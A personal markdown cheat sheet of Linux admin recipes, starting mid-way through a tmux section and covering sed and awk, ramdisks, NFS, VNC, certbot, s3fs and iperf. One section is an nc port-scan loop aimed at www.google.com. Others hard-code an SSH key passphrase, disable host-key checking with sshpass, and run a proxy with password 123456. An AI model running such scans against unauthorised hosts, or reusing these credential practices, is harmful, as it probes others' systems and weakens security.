bind-key -T copy-mode-vi MouseDragEnd1Pane send-keys -X copy-pipe-and-cancel "reattach-to-user-namespace pbcopy" \; display-message "copied to system clipboard"
```
##### Attach/Detach tmux
 - enter `tmux`: inside interactive tmux session now
 - enter `tmux detach`: exit to bash session 
 - enter `tmux attach`: enter to tmux session again

Short key prefix: `⌃b` (on Mac, `^` is Control)
##### pane management 
 - `%`: split pane, left-right
 - `"`: split pane, up-down
 - `0`: select pane
 - `x`: close current pane
 - `z`: maximize current pane, `z` again, to revert back

##### session management
 - `tmux list-keys`: list all short cut keys, including the `^b` as a prefix
 - `tmux list-commands`: list all commands
 - `tmux ls`: list all sessions
 - `tmux a -t foo`: attach to session named as `foo`
 - `tmux kill-session -t foo`: kill the session named as `foo`
 - `tmux kill-server`: kill all sessions

##### helper commands
 - `:set synchronizepane on`: `sync typed commands` on all pane, useful when need to execute comands to all pane 

##### copy mode
  - `^b[`: enter copy mode(actually I already use vi mode `set-window-option -g mode-keys vi`)
  - copy mode in vi format:
    - `/<text>`: search next
    - `?<text>`: search above
    - `^b`: jump back, must in the copy mode
    - `^f`: jump forward, must in the copy mode
    - `:<line>`: go to line number
    - `$`: end of current line
    - `0`: start of current line
  - `[[:space_key:]]`: start to copy to buffer
  - `up/left/down/right`: select words on screen
  - `[[:enter_key:]]`: end to copy to buffer
  - `q`: quit copy mode
  - `^b]`: paste all buffer from copy mode

  Ref: 
    - http://man.openbsd.org/OpenBSD-current/man1/tmux.1
    - https://blog.csdn.net/yangzhongxuan/article/details/6890232

## Disk RAID Setup in Linux
https://www.tecmint.com/understanding-raid-setup-in-linux/ 

## shell sed remove newlines
use `-e ':a' -e 'N' -e '$!ba' ` before `sed -e xxxx`
```bash
[03:04 AM morganwu@morgan-yinnut setup]$ cat abc.txt 
['1',
'2',
'3']
[03:04 AM morganwu@morgan-yinnut setup]$ cat abc.txt |sed -e ':a' -e 'N' -e '$!ba' -e 's/,\n/,/g' 
['1','2','3']
```
## Shell and awk 
Next command is to filter the jbd2/sdb-8, if $13 equals `[jbd2/sdb-8]` and $11 is greater than 40.0, then print all lines.
```bash
iotop -p 1004 -t -q | awk '{ if($13=="[jbd2/sdb-8]" && $11+0>40.0 ) print $0}'
```
Another way is to use `regex` filter and if to print the line: 
```bash
iotop -p 1004 -t -q | awk '/jbd2/ { if($11+0>0.0 ) print $0}'

# use `stdbuf -o0` to disabling buffering to output to log when io% >50%
iotop -p 1004 -t -q | stdbuf -o0 awk '/jbd2/ { if($11+0>50.0 ) print $0}'  > jbd2.txt
```
### awk to get mean and std-var
```bash
# calculate mean std-var
# data.txt should be one entry per line
awk '{for(i=1;i<=NF;i++) {sum[i] += $i; sumsq[i] += ($i)^2}}
     END {for (i=1;i<=NF;i++) {
     print "mean stdevp \n", sum[i]/NR, sqrt((sumsq[i]-sum[i]^2/NR)/NR)}
     }' data.txt
```
### awk to get words frequencies
```
cat words.txt | awk '{for(i=1;i<=NF;i++)print $i}' | sort | uniq -c | sort -r | awk '{print $2, $1}'
```

## Shell and sed traps
```bash
There are two levels of interpretation here: the shell, and sed.

In the shell, everything between single quotes is interpreted literally, except for single quotes themselves. You can effectively have a single quotes between single quotes by writing `'\''` (close single quote, one literal single quote, open single quote).

Sed uses [basic regular expressions](https://en.wikipedia.org/wiki/Regular_expression#POSIX_basic_and_extended). In a BRE, the characters `$.*[\]^` need to be quoted by preceding them by a backslash, except inside character sets (`[…]`). Letters, digits and `(){}+?|` must not be quoted (you can get away with quoting some of these in some implementations). The sequences `\(`, `\)`, `\n`, and in some implementations `\{`, `\}, `\+`, `\?`, `\|` and other backslash+alphanumerics have special meanings. You can get away with not quoting `$^]` in some positions in some implementations.

Furthermore, you need a backslash before `/` if it is to appear in the regex outside of bracket expressions. You can choose an alternate character as the delimiter by writing e.g. `s~/dir~/replacement~` or `\~/dir~p`; you'll need a backslash before the delimiter if you want to include it in the BRE. If you choose a character that has a special meaning in a BRE and you want to include it literally, you'll need three backslashes; I do not recommend this.

In a nutshell, for `sed 's/…/…/'`:

Write the regex between single quotes.
Use `'\''` to end up with a single quote in the regex.
Put a backslash before `$.*/[\]^` and only those characters (but not inside bracket expressions).
Inside a bracket expression, for `-` to be treated literally, make sure it is first or last (`[abc-]` or `[-abc]`, not `[a-bc]`)
Inside a bracket expression, for `^` to be treated literally, make sure it is not first (use `[abc^]`, not `[^abc]`)
To include `]` in the list of characters matched by a bracket expression, make it the first character (or first after `^` for a negated set): `[]abc]` or `[^]abc]` (not `[abc]]` nor `[abc\]]`).
In the replacement text:

`&` and `\` need to be quoted, as do the delimiter (usually `/`) and newlines.
\`` followed by a digit has a special meaning. \`` followed by a letter has a special meaning (special characters) in some implementations, and \ followed by some other character means \c or c depending on the implementation.
With single quotes around the argument (`sed 's/…/…/'`), use `'\''` to put a single quote in the replacement text.
If the regex or replacement text comes from a shell variable, remember that

the regex is a BRE, not a literal string;
in the regex, a newline needs to be expressed as `\n` (which will never match unless you have other `sed` code adding newline characters to the pattern space). But note that it won't work inside bracket expressions with some sed implementations;
in the replacement text, `&`, `\` and newlines need to be quoted;
the delimiter needs to be quoted (but not inside bracket expressions).
Use double quotes for interpolation: `sed -e "s/$BRE/$REPL/"`
```
From https://unix.stackexchange.com/questions/32907/what-characters-do-i-need-to-escape-when-using-sed-in-a-sh-script 


## scan port
```bash
#!/bin/bash
HOST=www.google.com
MIN=80
MAX=6000

echo "Scanning port from $MIN to $MAX on target host $HOST"
for i in $(seq $MIN 1 $MAX); do
  if printf "" | nc -v $HOST $i > /dev/null 2>&1 ; then
    echo "SUCCESS! PORT: $i. "
  fi
done
```

## Expect ssh-add 
Install first...
```bash
apt-get install expect -y 
# or 
yum install expect -y 
```
Then follow up next instructions...
`ssh-add.exp` file, please note how to write the argument here 
```bash
#!/usr/bin/expect

# with an argument
set key [lindex $argv 0]
# set value [lindex $argv 1], if you have more params

spawn ssh-add $key
expect "Enter passphrase for *:"
send "codingisfun\n"
expect "dentity added: *"
interact
```
and in the caller, please note we are using expect to execute this `.exp` script with a parameter

```bash
# start a ssh-agent
ret=`ps -ef|grep ssh-agent |grep -v grep`
[[ "$ret" == "0" ]] || eval `ssh-agent` 
expect ssh-add.exp "$DIR/xxx-deploy/playbooks/files/xxx_user/id_rsa" > /dev/null
# kill the ssh-agent
ssh-agent -k > /dev/null 2>&1
```
Of course, you can also use `expect` to achieve ssh login with a password input, however you still can do it using `sshpass`
```bash
echo "[`date`] Detect Python2 Env..."
sshpass -p $SSH_PASS ssh -oStrictHostKeyChecking=no -p $SSH_PORT $SSH_USER@$PUBLIC_IP 'test -e /usr/bin/python || (apt -y update && apt install -y python-minimal)'
```

### create a ram disk

```bash
# 1. mount a ram disk, 28GB
mount -t tmpfs -o size=28g tmpfs /mnt/ramdisk
# check ramdisk mount
[root@morganwu-yt0oj-x86 ~]# mount|grep ramdisk
tmpfs on /mnt/ramdisk type tmpfs (rw,relatime,size=29360128k)
tmpfs on /mnt/ramdisk type tmpfs (rw,relatime,size=29360128k)

# 2. append to /etc/fstab
echo "tmpfs       /mnt/ramdisk tmpfs   nodev,nosuid,noexec,nodiratime,size=28g   0 0" >> /etc/fstab

# 3. create crontab job to sync data from ramdisk to real disk
#    1. first one is to rsync every min, only when `/mnt/ramdisk/ccache/0` exist, ie. mounted, and not cleared
#    2. second one is to copy data from backup to ramdisk
$ crontab -l
# only copy files after uptime > 20 min AND ccache greater equal 17 items, OR files will be vanished
* * * * * [ `ls /mnt/ramdisk/ccache | wc -l` -lt 17 -o `uptime | awk '{print $3}'` -lt 20 ] || rsync --delete -avz /mnt/ramdisk /var/lib/backup
@reboot ls -1 /var/lib/backup/ramdisk/ccache/ | parallel rsync -avz /var/lib/backup/ramdisk/ccache/{} /mnt/ramdisk/ccache/ ; chown -R nfsnobody.nfsnobody /mnt/ramdisk/* ; chmod -R 755 /mnt/ramdisk/*


# 4. if we need to export it as NFS folder as global file cache?
#    1. use async for performance
#    2. use fsid=1 since this is tmpfs, required for tmpfs
#    3. use all_squash, so that files are squashed to nobody:nobody permissions
$ cat /etc/exports
/mnt/ramdisk/ccache *(rw,async,fsid=1,all_squash)

```


## remount /run directory using tmpfs filesystem
You can execute `mount |grep run` to get the options first and then only increase the size. 
```bash
mount -o remount,rw,nosuid,noexec,relatime,size=300M,mode=755 /run
```
Or you can add the line into `/etc/fstab`
```bash
tmpfs   /run    tmpfs  rw,nosuid,noexec,relatime,size=300M,mode=755 0 0
```
Ref: https://wiki.archlinux.org/index.php/tmpfs

## Crontab with Shell and PATH
```bash
SHELL=/bin/bash
HOME=/home/morganwu277
PATH=/home/morganwu277/py3/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
10 0 * * *  . ~/.bashrc && xxxx/xxx/xxx/command.sh >> /tmp/command.log 2>&1 
```

## install nfs server
http://cn.linux.vbird.org/linux_server/0330nfs/0330nfs-centos4.php     
in CentOS
```bash
### Server side
yum install nfs-utils -y
cat /etc/exports
# /home/morganwu/htap-ng *(rw,sync,all_squash,anonuid=11111,anongid=10)
# /home/morganwu/dockerhome *(rw,sync,all_squash,anonuid=11111,anongid=10)
# /mnt/ramdisk/ccache *(rw,async,fsid=1)
#### *: to all users
#### rw: read/write permission
#### sync: write data in both memory and disk. could be sync/async
#### all_squash: all users will be marked as anonymous user, i.e, nfsnobody
#### [optional] anonuid: anonymous user will be treated as 11111 user
#### [optional] anongid: anonymous user will be treated as 10 group
#### [optional] fsid=1: fsid, filesystem id, REQUIRED for tmpfs, ie. ramdisk
systemctl enable nfs-server ; systemctl start nfs-server


### Client side
yum install nfs-utils -y
sudo mount -t nfs -o async 9.30.249.209:/mnt/ramdisk/ccache /home/m36wu/dockerhome/.ccache

```
## VNC-Server
In CentOS, install `vnc-server` and then config the password for a specific user
```bash
yum install -y tigervnc-server.x86_64
[morganwu@agony1 ~]$ vncpasswd
Password:
Verify:
Would you like to enter a view-only password (y/n)? n
A view-only password is not used

```
and then make a copy of systemd conf and change the user
```bash
cp /lib/systemd/system/vncserver@.service  /etc/systemd/system/vncserver@:1.service
vi /etc/systemd/system/vncserver@:1.service
```
and its content is like below, change the `my_user` part
```bash
[Unit]
Description=Remote desktop service (VNC)
After=syslog.target network.target

[Service]
Type=forking
ExecStartPre=/bin/sh -c '/usr/bin/vncserver -kill %i > /dev/null 2>&1 || :'
ExecStart=/sbin/runuser -l my_user -c "/usr/bin/vncserver %i -geometry 1280x1024"
PIDFile=/home/my_user/.vnc/%H%i.pid
ExecStop=/bin/sh -c '/usr/bin/vncserver -kill %i > /dev/null 2>&1 || :'

[Install]
WantedBy=multi-user.target
```
and then restart the service
```bash
systemctl daemon-reload
systemctl enable vncserver@:1
systemctl start vncserver@:1
systemctl status vncserver@:1
```

## CertBot
0. install certbot
https://certbot.eff.org/docs/install.html#operating-system-packages
```bash
add-apt-repository ppa:certbot/certbot
apt-get update
apt-get install certbot python-certbot-nginx python-certbot-apache
certbot --version
```
1. needs to add DNS resolution from your DNS provider
2. gen certs using certbot
```bash
domain="xxx.cn"
certbot certonly --nginx --email xue777hua@gmail.com -d www.$domain -d $domain
```
3. show generated certs
```bash
certbot certificates
```
4. renew certs
```bash
certbot renew --cert-name <should be the name comes from above certbot certificates command>
```

## sysbench and other tools for load testing
 - sysbench: CPU performance and MySQL  https://www.centoshowtos.org/commands/sysbench/
 - httperf: web server load testing  https://www.centoshowtos.org/commands/httperf/     
In Ubuntu: https://www.howtoforge.com/how-to-benchmark-your-system-cpu-file-io-mysql-with-sysbench      
command for CPU benchmark
```bash
apt/yum install sysbench
sysbench --test=cpu --cpu-max-prime=20000 run
```

## Sublime tricks
1. get file name path, open console and type:
```bash
# get file name
view.file_name()
# copy file name into clipboard
sublime.set_clipboard(view.file_name())
```

## bash split by IFS, array manipulation 
```bash
  # here is var ignore_tables, split by using comma , symbol 
  ignore_tables=${2:-"submission_submission,authentication_usersessionsubmission"} # split by using comma
  if [[ "$ignore_tables" != "" ]]; then
    IFS=',' read -r -a tables <<< "$ignore_tables" # read into the var using IFS to split
    for t in "${tables[@]}" # iterate the array
    do
        ignore_tables_opt="$ignore_tables_opt --ignore-table=$dbname.$t"
    done
  fi
```
or, print a sinle element
```bash
echo "${array[0]}"
```
or, get the number of elements
```bash
echo "${#array[@]}"
```
or, manipulate array using index:
```bash
for index in "${!array[@]}"
do
    echo "$index ${array[index]}"
done
```


## pstree
show pstree with `-al -p`: 
- `-al`: args and don't truncate if too long...
- `-p`: parent and child process info
```bash
$ pstree -al -p 20667
perl,20667 -S bld -j20 -debug_build
  └─sh,20712 /xxxsrc/bin/bldRunMkCmdLog /xxxsrc PREBLD /xxxsrc PREBLD /xxxsrc/xxxroot/buildlog/.LOG_2019-04-28-01.35.49.3866 /xxxsrc compiledb make -f xxxroot/GNUmakefile ALL_COMPONENT_MAKEFILES_NEEDED=false -j8 prebld
      └─perl,20715 -S /xxxsrc/bin/bldRunMkCmdLog /xxxsrc PREBLD /xxxsrc PREBLD /xxxsrc/xxxroot/buildlog/.LOG_2019-04-28-01.35.49.3866 /xxxsrc compiledb make -f xxxroot/GNUmakefile ALL_COMPONENT_MAKEFILES_NEEDED=false -j8 prebld
          └─compiledb,20716 /usr/bin/compiledb make -f xxxroot/GNUmakefile ALL_COMPONENT_MAKEFILES_NEEDED=false -j8 prebld
              └─make,20717 -f xxxroot/GNUmakefile ALL_COMPONENT_MAKEFILES_NEEDED=false -j8 prebld
                  └─make,29186 -C /xxxsrc/bld -f prebld.make
                      └─sh,29219 -c /xxxsrc/bin/bldRunMkCmdLog engn/headers comp_prebld /xxxsrc "/xxxsrc/engn/headers" /xxxsrc/xxxroot/buildlog/.LOG_2019-04-28-01.35.49.3866 /xxxsrc \\\012make -rk -C /xxxsrc/engn/headers -f /xxxsrc/xxxroot/GNUmakefile  comp_prebld
                          └─perl,29232 -S /xxxsrc/bin/bldRunMkCmdLog engn/headers comp_prebld /xxxsrc /xxxsrc/engn/headers /xxxsrc/xxxroot/buildlog/.LOG_2019-04-28-01.35.49.3866 /xxxsrc make -rk -C /xxxsrc/engn/headers -f /xxxsrc/xxxroot/GNUmakefile comp_prebld
                              └─make,29264 -rk -C /xxxsrc/engn/headers -f /xxxsrc/xxxroot/GNUmakefile comp_prebld
                                  └─sh,8005 -c cd /xxxsrc/engn/cde/eventstore/engine ; bld style
                                      └─sh,8006 -c cd /xxxsrc/engn/cde/eventstore/engine ; bld style
                                          └─perl,8009 -S /xxxsrc/bin/bld style
                                              ├─compiledb,8030 /usr/bin/compiledb make -rk -f /xxxsrc/bld/GNUmakefile style
                                              │   └─make,9153 -Bnkw -rk -f /xxxsrc/bld/GNUmakefile style
                                              │       └─sh,9684 -c perl  > /xxxsrc/bld/Linux_AMD64/test_byte_rev_dll_linkdep.make
                                              │           └─perl,9686
                                              └─sh,8031 -c bldfilter | tee -ai 
                                                  ├─perl,8032 -S /xxxsrc/bin/bldfilter
                                                  └─tee,8033 -ai
```

## get a process current environmet value
```bash
cat /proc/29734/environ | xargs -n 1 -0 | grep xxx
```



## mount s3 as local dir
https://github.com/s3fs-fuse/s3fs-fuse#examples 
```
function mount_s3fs() {
  s3_dir=$1
  local_dir=$2
  s3fs ${AWS_S3_BUCKET_NAME}:${s3_dir} ${local_dir} -o passwd_file=${HOME}/.passwd-s3fs -o dbglevel=info -o curldbg -o use_path_request_style -o url=https://s3-${AWS_S3_REGION_NAME}.amazonaws.com
}

# example
s3fs assets_bucket.xxxxx.com:/static_assets/media /xxx/local/media -o passwd_file=/root/.passwd-s3fs -o dbglevel=info -o curldbg -o use_path_request_style -o url=https://s3-us-west-1.amazonaws.com -o use_cache=${cache_dir}
# for passwd-s3fs, https://github.com/s3fs-fuse/s3fs-fuse#examples 
```

## one line for ss-server
```
docker run --name ss-server -e ARGS=-v -e PASSWORD=123456 --restart=always -p8388:8388 -p8388:8388/udp -d shadowsocks/shadowsocks-libev
```
## random file generator

```bash
# generate random binary file, 1GB
dd if=/dev/urandom of=sample.bin count=1024 bs=1MiB
# generate ramdom text file, base64 hashed, original sz = 128MB, after base64 encoding, in total 174MB
openssl rand -out sample.txt -base64 $(( 2**27 ))
```

## urlencode from bash
py2:
```
encoded_value=$(python -c "import urllib; print urllib.quote('''$value''')")
```
py3:
```
encoded_value=$(python -c "import urllib.parse; print (urllib.parse.quote('''$value'''))")
```

## iperf network speed test
- TCP: 
```bash
# server
iperf -s -i 1
      # -s: server
      # -i: interval, second
# client
iperf -c 52.80.112.94 -i 1 -t 10 -P 5
      # -c: <server_ip>
      # -i: interval, second
      # -t: last for 10 sec
      # -P: 5 threads in parallel
```

- UDP: 
```bash
# server
iperf -s -i 1 -u
    # -u: udp packet
# client
iperf -c 52.80.112.94 -i 1 -t 10 -P 5 -u -b 20m
    # -b: 20m, buffer
```
